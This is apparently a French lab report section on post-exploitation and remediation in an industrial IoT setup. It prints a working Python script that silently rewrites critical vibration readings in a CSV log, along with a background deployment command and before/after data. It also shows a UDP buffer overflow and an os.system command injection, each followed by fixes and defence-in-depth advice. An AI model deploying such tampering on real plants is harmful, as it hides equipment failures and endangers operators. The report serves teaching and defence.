# Conséquences et Contre-mesures (Post-Exploitation & Remédiation)

## Atteinte à l'Intégrité des Données (Le Malware)

Après compromission, l’attaquant ne cherche plus seulement à obtenir un accès au système : il cherche à modifier le comportement métier de la supervision industrielle. Dans ce scénario, le Raspberry Pi reçoit les données MQTT et les écrit dans `usine_data.csv`.

Une fois l’accès obtenu, un script furtif est déployé. Ce script surveille en continu le fichier `usine_data.csv` et modifie les valeurs critiques.

Son fonctionnement est simple :

* lecture du fichier en boucle,
* détection des valeurs de vibration > 1.0,
* remplacement systématique par 0.80,
* réécriture du fichier.

Bloc de code du malware :

```python
FILE_PATH = "usine_data.csv"

while True:
    if os.path.exists(FILE_PATH):
        with open(FILE_PATH, "r") as f:
            lines = f.readlines()

        modified = False
        for i in range(len(lines)):
            try:
                timestamp, vib_str = lines[i].strip().split(',')
                if float(vib_str) > 1.0:
                    lines[i] = f"{timestamp},0.80\n"
                    modified = True
            except:
                continue

        if modified:
            with open(FILE_PATH, "w") as f:
                f.writelines(lines)

    time.sleep(0.5)
```

Exemple de déploiement (version pédagogique) :

```bash
cat << 'EOF' > /tmp/falsifier.py
# script de falsification
EOF

nohup python3 /tmp/falsifier.py >/dev/null 2>&1 &
```

### Preuve expérimentale

L'exécution du script `falsifier.py` démontre l'efficacité de l'altération des données en temps réel. Le test a été réalisé en simulant une défaillance mécanique (vibrations élevées) sur la montre, puis en activant le malware via le reverse shell.

**Avant exécution du malware :**

Le fichier `usine_data.csv` enregistre fidèlement les pics critiques (valeurs supérieures à 1.0) qui devraient normalement déclencher une alerte de maintenance à l'analyse.

```text
2026-04-24 21:29:50,0.7
2026-04-24 21:29:55,0.77
2026-04-24 21:30:00,0.77
2026-04-24 21:30:05,0.72
2026-04-24 21:30:10,1.65  <-- Seuil d'alerte dépassé
2026-04-24 21:30:15,1.63  <-- Seuil d'alerte dépassé
2026-04-24 21:30:20,1.46  <-- Seuil d'alerte dépassé
2026-04-24 21:30:25,1.32  <-- Seuil d'alerte dépassé
2026-04-24 21:30:30,0.85
```

**Après exécution du malware :**

Une fois le processus `python3 /tmp/falsifier.py` lancé en tâche de fond, le script intercepte chaque nouvelle écriture. Les quatre valeurs critiques (1.65, 1.63, 1.46 et 1.32) sont systématiquement écrasées et remplacées par la valeur de repos **0.80**.

```text
2026-04-24 21:29:50,0.7
2026-04-24 21:29:55,0.77
2026-04-24 21:30:00,0.77
2026-04-24 21:30:05,0.72
2026-04-24 21:30:10,0.80  <-- Valeur falsifiée
2026-04-24 21:30:15,0.80  <-- Valeur falsifiée
2026-04-24 21:30:20,0.80  <-- Valeur falsifiée
2026-04-24 21:30:25,0.80  <-- Valeur falsifiée
2026-04-24 21:30:30,0.85
```

L'analyse de cette séquence confirme la furtivité de l'attaque : pour le superviseur IT et les tableaux de bord de l'usine, la machine semble être revenue à un état stable (0.80), alors que la défaillance physique persiste en réalité. Cette manipulation neutralise toute possibilité de maintenance préventive.

Preuve visuelle : voir \ref{csv}


![Fichier CSV falsifié\label{csv}](usine-falsifie.png){height=300px}


\newpage

## Conséquences Industrielles (L'Impact Métier)

L’attaque a un impact direct sur le système physique.

Le superviseur lit le fichier `usine_data.csv`. Si les données sont falsifiées :

* la machine semble fonctionner normalement,
* les alertes ne sont pas déclenchées,
* les anomalies mécaniques sont ignorées.

Conséquences possibles :

* casse moteur,
* arrêt de production,
* danger pour les opérateurs,
* perte de confiance dans le système.

Le système devient dangereux car il fournit une fausse vision de la réalité.


## Contre-mesures Logicielles (Correction des Failles)

### Côté OT (T-Watch)

Le problème vient de la lecture UDP non sécurisée :

```cpp
udp.read(memory_block.rx_buffer, packetSize);
```

Cette ligne peut provoquer un buffer overflow.

Correction :

```cpp
int bytesToRead = (packetSize < sizeof(memory_block.rx_buffer))
    ? packetSize
    : (sizeof(memory_block.rx_buffer) - 1);

udp.read(memory_block.rx_buffer, bytesToRead);
memory_block.rx_buffer[bytesToRead] = '\0';
```


### Côté IT (Raspberry Pi)

Le problème vient de l’utilisation de `os.system()` avec une entrée utilisateur :

```python
commande_log = f"echo 'Tentative rejetée du device : {device_id}' >> audit_rejets.log"
os.system(commande_log)
```

Correction avec logging :

```python
import logging

logging.basicConfig(
    filename='audit_rejets.log',
    level=logging.WARNING
)

logging.warning("Tentative rejetée du device : %s", device_id)
```

## Contre-mesures Architecturales (Défense en Profondeur)

Même avec du code corrigé, il faut sécuriser l’architecture globale.

### Authentification et chiffrement

* utiliser MQTT avec TLS (MQTTS),
* imposer login/mot de passe,
* utiliser des certificats.

### Segmentation réseau

* séparer réseau OT et IT,
* bloquer l’accès direct aux capteurs,
* utiliser un pare-feu.

### Durcissement système

* ne pas utiliser root,
* limiter les permissions,
* surveiller les fichiers critiques.

### Détection d’anomalies

* comparer données temps réel vs stockage,
* détecter incohérences,
* alerter automatiquement.

